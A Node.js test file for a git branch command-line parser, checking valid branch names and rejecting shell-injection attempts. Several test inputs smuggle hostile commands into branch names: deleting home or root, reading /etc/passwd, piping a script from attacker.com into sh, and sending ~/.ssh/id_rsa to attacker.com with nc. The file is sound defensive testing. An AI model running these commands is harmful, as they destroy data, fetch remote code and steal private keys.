const {describe, it, mock} = require ('node:test')
const assert = require ('assert')
const ParsedArgs = require ('../lib/ParsedArgs')


describe('ParsedArgs', () => {
	const toArgv = s => s.split (/\s+/)
	it ('2 args not valid', async (t) => {
		assert.throws(() => new ParsedArgs (toArgv (`TASK-42 from`)).value ())
	})
	it ('2 args create not valid', async (t) => {
		assert.throws(() => new ParsedArgs (toArgv (`TASK-42 origin/release`)).value ())
	})
	it ('push branch', async (t) => {
		assert.deepStrictEqual(await new ParsedArgs ([]).value (), {dst: '', action: 'Push', src: '__CURRENT_BRANCH__'})
	})
	it ('switch to branch', async (t) => {
		assert.deepStrictEqual(await new ParsedArgs (toArgv (`TASK-42`)).value (), {dst: 'TASK-42', action: 'Switch', src: ''})
	})
	it ('create from release', async (t) => {
		assert.deepStrictEqual(await new ParsedArgs (toArgv (`TASK-42 from release`)).value (), {dst: 'TASK-42', action: 'Create', src: 'release'})
	})
	it ('deploy to release', async (t) => {
		assert.deepStrictEqual(await new ParsedArgs (toArgv (`TASK-42 to release`)).value (), {src: 'TASK-42', action: 'Merge', dst: 'release'})
	})
	it ('deploy current to release', async (t) => {
		assert.deepStrictEqual(await new ParsedArgs (toArgv (`to release`)).value (), {src: '__CURRENT_BRANCH__', action: 'Merge', dst: 'release'})
	})
	it ('help with -h flag', async (t) => {
		assert.deepStrictEqual(await new ParsedArgs (['-h']).value (), {action: 'Help'})
	})
	it ('help with --help flag', async (t) => {
		assert.deepStrictEqual(await new ParsedArgs (['--help']).value (), {action: 'Help'})
	})
	it ('reject semicolon command separator', async (t) => {
		assert.throws(() => new ParsedArgs (['test; rm -rf /', 'from', 'main']).value ())
	})
	it ('reject pipe operator', async (t) => {
		assert.throws(() => new ParsedArgs (['test|cat /etc/passwd', 'from', 'main']).value ())
	})
	it ('reject boolean AND operator', async (t) => {
		assert.throws(() => new ParsedArgs (['test&&malicious', 'from', 'main']).value ())
	})
	it ('reject backtick command substitution', async (t) => {
		assert.throws(() => new ParsedArgs (['test`whoami`', 'from', 'main']).value ())
	})
	it ('reject dollar command substitution', async (t) => {
		assert.throws(() => new ParsedArgs (['test$(id)', 'from', 'main']).value ())
	})
	it ('reject output redirection', async (t) => {
		assert.throws(() => new ParsedArgs (['test>output.txt', 'from', 'main']).value ())
	})
	it ('reject single quotes', async (t) => {
		assert.throws(() => new ParsedArgs (["test'malicious'", 'from', 'main']).value ())
	})
	it ('reject double quotes', async (t) => {
		assert.throws(() => new ParsedArgs (['test"malicious"', 'from', 'main']).value ())
	})
	it ('reject hash comment', async (t) => {
		assert.throws(() => new ParsedArgs (['test#comment', 'from', 'main']).value ())
	})
	it ('reject ampersand background', async (t) => {
		assert.throws(() => new ParsedArgs (['test&', 'from', 'main']).value ())
	})
	it ('reject spaces in branch name', async (t) => {
		assert.throws(() => new ParsedArgs (['test malicious', 'from', 'main']).value ())
	})
	it ('reject file creation attack', async (t) => {
		assert.throws(() => new ParsedArgs (['test; touch /tmp/PWNED', 'from', 'main']).value ())
	})
	it ('reject RCE attack', async (t) => {
		assert.throws(() => new ParsedArgs (['branch`curl attacker.com/evil.sh|sh`', 'from', 'main']).value ())
	})
	it ('reject SSH key exfiltration attack', async (t) => {
		assert.throws(() => new ParsedArgs (['task-42; cat ~/.ssh/id_rsa | nc attacker.com 1234 #', 'from', 'main']).value ())
	})
	it ('reject data destruction attack', async (t) => {
		assert.throws(() => new ParsedArgs (['feature; rm -rf ~ #', 'from', 'main']).value ())
	})
	it ('reject branch starting with slash', async (t) => {
		assert.throws(() => new ParsedArgs (['/invalid', 'from', 'main']).value ())
	})
	it ('reject branch ending with slash', async (t) => {
		assert.throws(() => new ParsedArgs (['invalid/', 'from', 'main']).value ())
	})
	it ('reject branch with double slash', async (t) => {
		assert.throws(() => new ParsedArgs (['feature//bug', 'from', 'main']).value ())
	})
	it ('reject branch with double dot', async (t) => {
		assert.throws(() => new ParsedArgs (['feature..bug', 'from', 'main']).value ())
	})
	it ('reject branch starting with dot', async (t) => {
		assert.throws(() => new ParsedArgs (['.hidden', 'from', 'main']).value ())
	})
	it ('reject branch ending with .lock', async (t) => {
		assert.throws(() => new ParsedArgs (['feature.lock', 'from', 'main']).value ())
	})
	it ('accept branch with dash', async (t) => {
		assert.doesNotThrow(() => new ParsedArgs (['feature-123', 'from', 'main']).value ())
	})
	it ('accept branch with underscore', async (t) => {
		assert.doesNotThrow(() => new ParsedArgs (['task_42', 'from', 'main']).value ())
	})
	it ('accept branch with dots', async (t) => {
		assert.doesNotThrow(() => new ParsedArgs (['release.1.0', 'from', 'main']).value ())
	})
	it ('accept branch with slash', async (t) => {
		assert.doesNotThrow(() => new ParsedArgs (['feature/user-auth', 'from', 'main']).value ())
	})
	it ('accept branch with multiple slashes', async (t) => {
		assert.doesNotThrow(() => new ParsedArgs (['team/project/task', 'from', 'main']).value ())
	})
})
